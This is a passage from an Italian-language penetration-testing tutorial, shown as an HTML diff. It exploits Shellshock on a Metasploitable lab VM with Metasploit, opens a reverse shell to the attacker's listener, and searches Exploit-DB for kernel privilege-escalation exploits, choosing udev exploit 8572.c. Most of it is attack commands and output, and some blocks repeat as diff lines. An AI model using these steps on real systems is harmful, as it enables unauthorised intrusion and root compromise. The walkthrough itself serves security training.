+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; options 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name            Current Setting    Required  Description
+</span></span><span style="display:flex;"><span>   ----            ---------------    --------  -----------
+</span></span><span style="display:flex;"><span>   CMD_MAX_LENGTH  <span style="color:#ae81ff">2048</span>               yes       CMD max line length
+</span></span><span style="display:flex;"><span>   CVE             CVE-2014-6271      yes       CVE to check/exploit <span style="color:#f92672">(</span>Accepted: CVE-2014-6271, CVE-2014-6278<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   HEADER          User-Agent         yes       HTTP header to use
+</span></span><span style="display:flex;"><span>   METHOD          GET                yes       HTTP method to use
+</span></span><span style="display:flex;"><span>   Proxies                            no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   RHOSTS          192.168.1.245      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span style="display:flex;"><span>   RPATH           /bin               yes       Target PATH <span style="color:#66d9ef">for</span> binaries used by the CmdStager
+</span></span><span style="display:flex;"><span>   RPORT           <span style="color:#ae81ff">80</span>                 yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SSL             false              no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
+</span></span><span style="display:flex;"><span>   SSLCert                            no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   TARGETURI       /cgi-bin/hello.sh  yes       Path to CGI script
+</span></span><span style="display:flex;"><span>   TIMEOUT         <span style="color:#ae81ff">5</span>                  yes       HTTP read response timeout <span style="color:#f92672">(</span>seconds<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   URIPATH                            no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   VHOST                              no        HTTP server virtual host
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name     Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----     ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span style="display:flex;"><span>   SRVPORT  <span style="color:#ae81ff">8080</span>             yes       The local port to listen on.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>linux/x86/shell/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   LHOST  192.168.1.176    yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Linux x86
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span></code></pre></div><p>Alcuni moduli Metasploit hanno una piccola funzione utile che controllerà se il bersaglio è vulnerabile. Digitiamo <strong>check</strong>, se il modulo lo consente, verranno visualizzate le informazioni sulla vulnerabilità o meno del bersaglio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; check 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.245:80 - The target is vulnerable.
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><p>Possiamo vedere che il bersaglio è davvero vulnerabile, quindi usiamo il comando <strong>exploit</strong> per lanciare l&rsquo;attacco. Viene aperta una sessione di shell e ora possiamo eseguire comandi come <strong>id</strong> e <strong>whoami</strong> per visualizzare le informazioni sull&rsquo;utente corrente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; exploit 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.1.176:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command Stager progress - 100.00% <span style="color:#66d9ef">done</span> <span style="color:#f92672">(</span>1092/1092 bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">36</span> bytes<span style="color:#f92672">)</span> to 192.168.1.245
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.1.176:4444 -&gt; 192.168.1.245:34196<span style="color:#f92672">)</span> at 2023-07-18 22:19:53 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><h1 id="privilage-escalation">Privilage Escalation<a href="#privilage-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Useremo un exploit del kernel per aumentare i privilegi e ottenere il root, quindi prima dobbiamo trovare alcune informazioni sull&rsquo;obiettivo. Poiché abbiamo già una shell, possiamo usare il comando <strong>uname -a</strong> per visualizzare le informazioni del kernel sul sistema. Il comando <strong>lsb_release -a</strong> è utile anche per scoprire quale distribuzione è in esecuzione e le relative informazioni sulla versione:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; exploit
-
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.1.176:4444 
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command Stager progress - 100.00% <span style="color:#66d9ef">done</span> <span style="color:#f92672">(</span>1092/1092 bytes<span style="color:#f92672">)</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">36</span> bytes<span style="color:#f92672">)</span> to 192.168.1.245
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>192.168.1.176:4444 -&gt; 192.168.1.245:59113<span style="color:#f92672">)</span> at 2023-07-18 22:46:43 +0200
-
-id
-uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
-whoami
-www-data
-uname -a
-Linux metasploitable 2.6.24-16-server <span style="color:#75715e">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span>
-lsb_release -a
-No LSB modules are available.
-Distributor ID: Ubuntu
-Description:    Ubuntu 8.04
-Release:        8.04
-Codename:       hardy
-</code></pre></div><p>Da qui, possiamo cercare un exploit da utilizzare. I comandi che abbiamo appena eseguito ci dicono che l&rsquo;obiettivo esegue Ubuntu 8.04 con la versione del kernel 2.6.24. Kali contiene una versione locale di Exploit-DB, un database che contiene vari exploit, codici e pubblicazioni. Possiamo accedervi con uno strumento estremamente utile chiamato SearchSploit eseguendo il comando <strong>searchsploit</strong> dal terminale:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-└─$ searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
-Linux Kernel <span style="color:#f92672">(</span>Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;ldso_dynamic Stack Clash&#39;</span> Local Privilege Escalation                              | linux_x86/local/42276.c
-Linux Kernel 2.2.25/2.4.24/2.6.2 - <span style="color:#e6db74">&#39;mremap()&#39;</span> Local Privilege Escalation                                                                                         | linux/local/160.c
-Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                 | linux/local/22362.c
-Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                                 | linux/local/22363.c
-Linux Kernel 2.4.1 &lt; 2.4.37 / 2.6.1 &lt; 2.6.32-rc5 - <span style="color:#e6db74">&#39;pipe.c&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                                                       | linux/local/9844.py
-Linux Kernel 2.4.23/2.6.0 - <span style="color:#e6db74">&#39;do_mremap()&#39;</span> Bound Checking Privilege Escalation                                                                                    | linux/local/145.c
-Linux Kernel 2.4.30/2.6.11.5 - BlueTooth <span style="color:#e6db74">&#39;bluez_sock_create&#39;</span> Local Privilege Escalation                                                                          | linux/local/25289.c
-Linux Kernel 2.4.4 &lt; 2.4.37.4 / 2.6.0 &lt; 2.6.30.4 - <span style="color:#e6db74">&#39;Sendpage&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                            | linux/local/19933.rb
-Linux Kernel 2.4.x/2.6.x <span style="color:#f92672">(</span>CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE <span style="color:#ae81ff">10</span> SP2/11 / Ubuntu 8.10<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>PPC<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;sock_sendpage()&#39;</span> Local Privilege Escalation                     | linux/local/9545.c
-Linux Kernel 2.4.x/2.6.x - <span style="color:#e6db74">&#39;Bluez&#39;</span> BlueTooth Signed Buffer Index Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                        | linux/local/926.c
-Linux Kernel 2.4.x/2.6.x - <span style="color:#e6db74">&#39;uselib()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                                                                             | linux/local/895.c
-Linux Kernel 2.4.x/2.6.x - BlueTooth Signed Buffer Index Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                | linux/local/25288.c
-Linux Kernel 2.4/2.6 <span style="color:#f92672">(</span>Fedora 11<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;sock_sendpage()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                              | linux/local/9598.txt
-Linux Kernel 2.4/2.6 <span style="color:#f92672">(</span>RedHat Linux <span style="color:#ae81ff">9</span> / Fedora Core <span style="color:#ae81ff">4</span> &lt; <span style="color:#ae81ff">11</span> / Whitebox <span style="color:#ae81ff">4</span> / CentOS 4<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;sock_sendpage()&#39;</span> Ring0 Privilege Escalation <span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>                            | linux/local/9479.c
-Linux Kernel 2.4/2.6 <span style="color:#f92672">(</span>x86-64<span style="color:#f92672">)</span> - System Call Emulation Privilege Escalation                                                                                       | linux_x86-64/local/4460.c
-Linux Kernel 2.4/2.6 - <span style="color:#e6db74">&#39;sock_sendpage()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                                                                          | linux/local/9641.txt
-Linux Kernel 2.6 <span style="color:#f92672">(</span>Debian 4.0 / Ubuntu / Gentoo<span style="color:#f92672">)</span> UDEV &lt; 1.4.1 - Local Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                    | linux/local/8478.sh
-Linux Kernel 2.6 <span style="color:#f92672">(</span>Gentoo / Ubuntu 8.10/9.04<span style="color:#f92672">)</span> UDEV &lt; 1.4.1 - Local Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                       | linux/local/8572.c
-Linux Kernel 2.6 &lt; 2.6.19 <span style="color:#f92672">(</span>White Box <span style="color:#ae81ff">4</span> / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;ip_append_data()&#39;</span> Ring0 Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                             | linux_x86/local/9542.c
-Linux Kernel 2.6.0 &lt; 2.6.31 - <span style="color:#e6db74">&#39;pipe.c&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                            | linux/local/33321.c
-Linux Kernel 2.6.10 &lt; 2.6.31.5 - <span style="color:#e6db74">&#39;pipe.c&#39;</span> Local Privilege Escalation                                                                                             | linux/local/40812.c
-Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;logrotate prctl()&#39;</span> Local Privilege Escalation                                                                                  | linux/local/2031.c
-Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;sys_prctl()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                    | linux/local/2004.c
-Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;sys_prctl()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                                    | linux/local/2005.c
-Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;sys_prctl()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                                                                    | linux/local/2006.c
-Linux Kernel 2.6.13 &lt; 2.6.17.4 - <span style="color:#e6db74">&#39;sys_prctl()&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>4<span style="color:#f92672">)</span>                                                                                    | linux/local/2011.sh
-Linux Kernel 2.6.17 - <span style="color:#e6db74">&#39;Sys_Tee&#39;</span> Local Privilege Escalation                                                                                                       | linux/local/29714.txt
-Linux Kernel 2.6.17 &lt; 2.6.24.1 - <span style="color:#e6db74">&#39;vmsplice&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                                       | linux/local/5092.c
-Linux Kernel 2.6.17.4 - <span style="color:#e6db74">&#39;proc&#39;</span> Local Privilege Escalation                                                                                                        | linux/local/2013.c
-Linux Kernel 2.6.18 &lt; 2.6.18-20 - Local Privilege Escalation                                                                                                     | linux/local/10613.c
-Linux Kernel 2.6.19 &lt; 5.9 - <span style="color:#e6db74">&#39;Netfilter Local Privilege Escalation                                                                                                | linux/local/50135.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - &#39;</span>Dirty COW /proc/self/mem<span style="color:#e6db74">&#39; Race Condition Privilege Escalation (SUID Method)                                               | linux/local/40616.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.22 &lt; 3.9 - &#39;</span>Dirty COW /proc/self/mem<span style="color:#e6db74">&#39; Race Condition Privilege Escalation (/etc/passwd Method)                                                  | linux/local/40847.cpp
-</span><span style="color:#e6db74">Linux Kernel 2.6.22 &lt; 3.9 - &#39;</span>Dirty COW<span style="color:#e6db74">&#39; &#39;</span>PTRACE_POKEDATA<span style="color:#e6db74">&#39; Race Condition Privilege Escalation (/etc/passwd Method)                                               | linux/local/40839.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.23 &lt; 2.6.24 - &#39;</span>vmsplice<span style="color:#e6db74">&#39; Local Privilege Escalation (1)                                                                                         | linux/local/5093.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - &#39;</span>set_selection<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; UTF-8 Off-by-One Privilege Escalation              | linux_x86-64/local/9083.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.27 &lt; 2.6.36 (RedHat x86-64) - &#39;</span>compat<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                               | linux_x86-64/local/15024.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.28/3.0 (DEC Alpha Linux) - Local Privilege Escalation                                                                                           | linux/local/17391.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.29 - &#39;</span>ptrace_attach<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Race Condition Privilege Escalation                                                                                      | linux/local/8678.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.30 &lt; 2.6.30.1 / SELinux (RHEL 5) - Local Privilege Escalation                                                                                   | linux/local/9191.txt
-</span><span style="color:#e6db74">Linux Kernel 2.6.32 (Ubuntu 10.04) - &#39;</span>/proc<span style="color:#e6db74">&#39; Handling SUID Privilege Escalation                                                                                  | linux/local/41770.txt
-</span><span style="color:#e6db74">Linux Kernel 2.6.32 - &#39;</span>pipe.c<span style="color:#e6db74">&#39; Local Privilege Escalation (4)                                                                                                    | linux/local/10018.sh
-</span><span style="color:#e6db74">Linux Kernel 2.6.32 &lt; 3.x (CentOS 5/6) - &#39;</span>PERF_EVENTS<span style="color:#e6db74">&#39; Local Privilege Escalation (1)                                                                            | linux/local/25444.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.36-rc8 - &#39;</span>RDS Protocol<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                              | linux/local/15285.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - &#39;</span>Full-Nelson.c<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                         | linux/local/15704.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64) - &#39;</span>Mempodipper<span style="color:#e6db74">&#39; Local Privilege Escalation (1)                                                             | linux/local/18411.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.39 &lt; 3.2.2 (x86/x64) - &#39;</span>Mempodipper<span style="color:#e6db74">&#39; Local Privilege Escalation (2)                                                                             | linux/local/35161.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.9 &lt; 2.6.11 (RHEL 4) - &#39;</span>SYS_EPoll_Wait<span style="color:#e6db74">&#39; Local Integer Overflow / Local Privilege Escalation                                                      | linux/local/1397.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.x (Gentoo 2.6.29rc1) - &#39;</span>ptrace_attach<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                               | linux/local/8673.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.x - &#39;</span>pipe.c<span style="color:#e6db74">&#39; Local Privilege Escalation (2)                                                                                                     | linux/local/33322.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.x - &#39;</span>SYS_EPoll_Wait<span style="color:#e6db74">&#39; Local Integer Overflow / Local Privilege Escalation (1)                                                                    | linux/local/25202.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.x - Ext4 &#39;</span>move extents<span style="color:#e6db74">&#39; ioctl Privilege Escalation                                                                                              | linux/local/33395.txt
-</span><span style="color:#e6db74">Linux Kernel 2.6.x - Ptrace Privilege Escalation                                                                                                                 | linux/local/30604.c
-</span><span style="color:#e6db74">Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - &#39;</span>Mutagen Astronomy<span style="color:#e6db74">&#39; Local Privilege Escalation                                           | linux_x86-64/local/45516.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.11.5 - BlueTooth Stack Privilege Escalation                                                                                                   | linux/local/4756.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.19 (Debian 4) - &#39;</span>udp_sendmsg<span style="color:#e6db74">&#39; Local Privilege Escalation (3)                                                                                  | linux/local/9575.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.19 (x86/x64) - &#39;</span>udp_sendmsg<span style="color:#e6db74">&#39; Local Privilege Escalation (2)                                                                                   | linux/local/9574.txt
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.22 - &#39;</span>ftruncate<span style="color:#f92672">()</span><span style="color:#e6db74">&#39;/&#39;</span>open<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                        | linux/local/6851.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.28 - &#39;</span>fasync_helper<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                             | linux/local/33523.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.29 - &#39;</span>exit_notify<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                               | linux/local/8369.sh
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86) - &#39;</span>CAP_SYS_ADMIN<span style="color:#e6db74">&#39; Local Privilege Escalation (1)                                                                        | linux_x86/local/15916.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86/x64) - &#39;</span>CAP_SYS_ADMIN<span style="color:#e6db74">&#39; Local Privilege Escalation (2)                                                                    | linux/local/15944.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - &#39;</span>CAN BCM<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                         | linux/local/14814.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.36-rc4-git2 (x86-64) - &#39;</span>ia32syscall<span style="color:#e6db74">&#39; Emulation Privilege Escalation                                                                           | linux_x86-64/local/15023.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.36.2 (Ubuntu 10.04) - &#39;</span>Half-Nelson.c<span style="color:#e6db74">&#39; Econet Privilege Escalation                                                                             | linux/local/17787.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.37-rc2 - &#39;</span>ACPI custom_method<span style="color:#e6db74">&#39; Local Privilege Escalation                                                                                      | linux/local/15774.c
-</span><span style="color:#e6db74">Linux Kernel &lt; 2.6.7-rc3 (Slackware 9.1 / Debian 3.0) - &#39;</span>sys_chown<span style="color:#f92672">()</span><span style="color:#e6db74">&#39; Group Ownership Alteration Privilege Escalation                                            | linux/local/718.c
-</span><span style="color:#e6db74">ReiserFS (Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10) - &#39;</span>xattr<span style="color:#960050;background-color:#1e0010">&#39;</span> Local Privilege Escalation                                                                   | linux/local/12130.py
-Samba 2.2.8 <span style="color:#f92672">(</span>Linux Kernel 2.6 / Debian / Mandrake<span style="color:#f92672">)</span> - Share Privilege Escalation                                                                                  | linux/local/23674.txt
-</code></pre></div><p>Poiché stiamo cercando un exploit di privilage escalation, cerchiamo <strong>privilege</strong>, quindi utilizziamo <em>grep</em> per convogliare la nostra ricerca in risultati più ristretti ignorando maiuscole e minuscole con il flag <em>-i</em>. Per questo esempio, utilizzeremo l&rsquo;exploit 8572.c, che sfrutta un difetto nel gestore dispositivi UDEV, consentendo l&rsquo;esecuzione del codice tramite un messaggio Netlink non verificato. Basta copiare la posizione dell&rsquo;exploit e utilizzare il comando locate per trovare il percorso completo, che è <strong>/usr/share/exploitdb/exploits/linux/local/8572.c</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-└─$ locate linux/local/8572.c
-/usr/share/exploitdb/exploits/linux/local/8572.c
-</code></pre></div><p>Questo exploit è scritto in C (da cui l&rsquo;estensione .c), ma non dovremo preoccuparci del codice sorgente: verrà eseguito solo dopo averlo compilato, ma non fa male prendere l&rsquo;abitudine di leggere codice per vedere esattamente cosa fa. Ora possiamo estrarre quel file per visualizzare le informazioni su questo exploit oltre a eventuali note per gli sviluppatori:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">* cve-2009-1185.c
-*
-* udev &lt; <span style="color:#ae81ff">1141</span> Local Privilege Escalation Exploit
-* Jon Oberheide &lt;jon@oberheide.org&gt;
-* http://jon.oberheide.org
-*
-* Information:
-*
-*   http://cvemitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2009-1185
-*
-*   udev before 1.4.1 does not verify whether a NETLINK message originates
-*   from kernel space, which allows local users to gain privileges by sending
-*   a NETLINK message from user space.
-*
-* Notes:
-*
-*   An alternative version of kcope<span style="color:#960050;background-color:#1e0010">&#39;</span>s exploit.  This exploit leverages the
-*   95-udev-late.rules functionality that is meant to run arbitrary commands
-*   when a device is removed.  A bit cleaner and reliable as long as you
-*   distro ships that rule file.
-*
-*   Tested on Gentoo, Intrepid, and Jaunty.
-*
-* Usage:
-*
-*   Pass the PID of the udevd netlink socket <span style="color:#f92672">(</span>listed in /proc/net/netlink,
-*   usually is the udevd PID minus 1<span style="color:#f92672">)</span> as argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.
-*
-*   The exploit will execute /tmp/run as root so throw whatever payload you
-*   want in there.
-</code></pre></div><p>Per utilizzare questo exploit, deve trovarsi sulla macchina di destinazione. Il modo più semplice per farlo è ospitare il file su un server Apache locale sulla nostra macchina Kali, connettersi al server dalla macchina di destinazione e infine scaricare il file. Prima di farlo, tuttavia, è necessario compiere alcuni passaggi preparatori.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.1.176:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command Stager progress - 100.00% <span style="color:#66d9ef">done</span> <span style="color:#f92672">(</span>1092/1092 bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">36</span> bytes<span style="color:#f92672">)</span> to 192.168.1.245
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>192.168.1.176:4444 -&gt; 192.168.1.245:59113<span style="color:#f92672">)</span> at 2023-07-18 22:46:43 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>id
